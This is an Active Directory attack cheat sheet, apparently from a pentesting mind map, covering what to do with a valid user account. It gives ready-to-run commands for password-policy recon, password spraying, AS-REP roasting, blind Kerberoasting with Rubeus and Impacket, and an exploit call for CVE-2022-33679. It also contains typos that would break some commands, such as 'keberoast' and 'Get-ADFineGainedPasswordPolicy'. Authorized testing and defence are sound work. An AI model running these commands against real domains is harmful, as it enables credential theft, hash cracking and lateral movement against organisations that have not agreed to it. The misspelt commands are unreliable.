# Valid user (no password)

## Password Spray
- Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)
  - default policy
    - `nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol`
[https://www.thehacker.recipes/ad/recon/password-policy](https://www.thehacker.recipes/ad/recon/password-policy)
    - `Get-ADDefaultDomainPasswordPolicy`
    - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy`
  - Fined Policy (Privileged)
    - `ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols`
    - `Get-ADFineGainedPasswordPolicy -filter *`
    - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available`
- ⚠️ user == password >>> Clear text Credentials
  - `nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success`
  - `sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass`
- ⚠️ usuals passwords  (SeasonYear!, Company123, ...) >>> Clear text Credentials
  - `nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success`
  - `sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>`
  - `kerbrute passwordspray -d <domain> <users.txt> <password>`

## ASREPRoast
- List ASREPRoastable Users (need creds)
  - `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u`
- ASREP roasting >>> Hash found ASREP
  - `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>`
  - `nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>`
  - `Rubeus.exe asreproast /format:hashcat`
- Blind Kerberoasting >>> Hash found TGS
  - `Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>`
  - `GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/`
- CVE-2022-33679 @CVE@ >>> Lat move PTT 
  - `CVE-2022-33679.py <domain>/<user> <target>`
